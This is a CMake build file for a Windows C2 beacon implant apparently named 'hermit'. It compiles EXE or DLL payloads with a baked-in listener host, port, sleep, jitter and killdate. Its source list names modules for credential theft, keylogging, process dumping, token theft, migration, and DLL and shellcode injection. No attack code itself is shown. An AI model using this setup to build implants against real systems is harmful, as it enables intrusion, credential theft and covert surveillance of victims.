cmake_minimum_required(VERSION 3.22)
project(${PAYLOAD_NAME}.${PAYLOAD_ARCH})

# COMPILER
if(${PAYLOAD_ARCH} STREQUAL "amd64")
    set(CMAKE_CXX_COMPILER x86_64-w64-mingw32-g++)
elseif(${PAYLOAD_ARCH} STREQUAL "i686")
    set(CMAKE_CXX_COMPILER i686-w64-mingw32-g++)
endif()

set(CMAKE_CXX_STANDARD 20)
set(CMAKE_CXX_STANDARD_REQUIRED ON)

# FLAGS
set(CMAKE_CXX_FLAGS "-municode -Os -s \
    -fno-asynchronous-unwind-tables -falign-jumps=1 -falign-labels=1 \
    -ffunction-sections -fdata-sections -fno-exceptions -fPIC \
    -static-libgcc \
    -Wl,-subsystem,windows,-s,--no-seh,--enable-stdcall-fixup,--gc-sections,-Bstatic"
)

# INCLUDE
include_directories(include)

# DEFINE
if(${PAYLOAD_TYPE} STREQUAL \"beacon\")
    add_compile_definitions(PAYLOAD_SLEEP=${PAYLOAD_SLEEP})
    add_compile_definitions(PAYLOAD_JITTER=${PAYLOAD_JITTER})
    add_compile_definitions(PAYLOAD_KILLDATE=${PAYLOAD_KILLDATE})
endif()
add_compile_definitions(PAYLOAD_TYPE=${PAYLOAD_TYPE})
add_compile_definitions(LISTENER_PROTOCOL=${LISTENER_PROTOCOL})
add_compile_definitions(LISTENER_HOST=${LISTENER_HOST})
add_compile_definitions(LISTENER_PORT=${LISTENER_PORT})
add_compile_definitions(REQUEST_PATH_CHECKIN=${REQUEST_PATH_CHECKIN})
add_compile_definitions(REQUEST_PATH_TASKGET=${REQUEST_PATH_TASKGET})
add_compile_definitions(REQUEST_PATH_TASKRESULT=${REQUEST_PATH_TASKRESULT})
add_compile_definitions(REQUEST_PATH_WEBSOCKET=${REQUEST_PATH_WEBSOCKET})
add_compile_definitions(REQUEST_PATH_DOWNLOAD=${REQUEST_PATH_DOWNLOAD})
add_compile_definitions(REQUEST_PATH_UPLOAD=${REQUEST_PATH_UPLOAD})
add_compile_definitions(REQUEST_PATH_SOCKET_OPEN=${REQUEST_PATH_SOCKET_OPEN})
add_compile_definitions(REQUEST_PATH_SOCKET_CLOSE=${REQUEST_PATH_SOCKET_CLOSE})

# SOURCE
if(${PAYLOAD_TYPE} STREQUAL \"beacon\")
    set(SOURCE
            src/main/beacon_${PAYLOAD_FORMAT}.cpp
            src/hermit.cpp
            src/core/handler.cpp
            src/core/procs.cpp
            src/core/socket.cpp
            src/core/state.cpp
            src/core/stdout.cpp
            src/core/system/arch.cpp
            src/core/system/env.cpp
            src/core/system/fs.cpp
            src/core/system/group.cpp
            src/core/system/http.cpp
            src/core/system/priv.cpp
            src/core/system/process.cpp
            src/core/system/user.cpp
            src/core/technique/injection/dll_injection.cpp
            src/core/technique/injection/shellcode_injection.cpp
            src/core/tasks/cat.cpp
            src/core/tasks/cd.cpp
            src/core/tasks/connect.cpp
            src/core/tasks/cp.cpp
            src/core/tasks/creds.cpp
            src/core/tasks/dll.cpp
            src/core/tasks/download.cpp
            src/core/tasks/env.cpp
            src/core/tasks/execute.cpp
            src/core/tasks/group.cpp
            src/core/tasks/history.cpp
            src/core/tasks/ip.cpp
            src/core/tasks/keylog.cpp
            src/core/tasks/kill.cpp
            src/core/tasks/ls.cpp
            src/core/tasks/migrate.cpp
            src/core/tasks/mkdir.cpp
            src/core/tasks/mv.cpp
            src/core/tasks/net.cpp
            src/core/tasks/procdump.cpp
            src/core/tasks/ps.cpp
            src/core/tasks/pwd.cpp
            src/core/tasks/reg.cpp
            src/core/tasks/rm.cpp
            src/core/tasks/rmdir.cpp
            src/core/tasks/rportfwd.cpp
            src/core/tasks/runas.cpp
            src/core/tasks/screenshot.cpp
            src/core/tasks/shellcode.cpp
            src/core/tasks/sleep.cpp
            src/core/tasks/token.cpp
            src/core/tasks/upload.cpp
            src/core/tasks/user.cpp
            src/core/tasks/whoami.cpp
            src/core/utils/convert.cpp
            src/core/utils/random.cpp
            src/core/utils/split.cpp
    )
# elseif(${PAYLOAD_TYPE} STREQUAL \"interactive\")
endif()

# LINK LIBRATILIES
# link_libraries(wtsapi32 mscoree mscorlib)
link_libraries(dbghelp gdi32 gdiplus iphlpapi netapi32 ntdll psapi shlwapi winhttp wsock32 ws2_32)

# ADD
if(${PAYLOAD_FORMAT} STREQUAL "dll")
    add_library(${PROJECT_NAME} SHARED ${SOURCE})
    set_target_properties(${PROJECT_NAME}
        PROPERTIES
            LIBRARY_OUTPUT_DIRECTORY ${OUTPUT_DIRECTORY}
            PREFIX ""
            SUFFIX ".dll"
    )
    add_definitions(-DIS_DLL)
elseif(${PAYLOAD_FORMAT} STREQUAL "exe")
    add_executable(${PROJECT_NAME} WIN32 ${SOURCE})
    set_target_properties(${PROJECT_NAME}
        PROPERTIES
            RUNTIME_OUTPUT_DIRECTORY ${OUTPUT_DIRECTORY}
            PREFIX ""
            SUFFIX ".exe"
    )
endif()
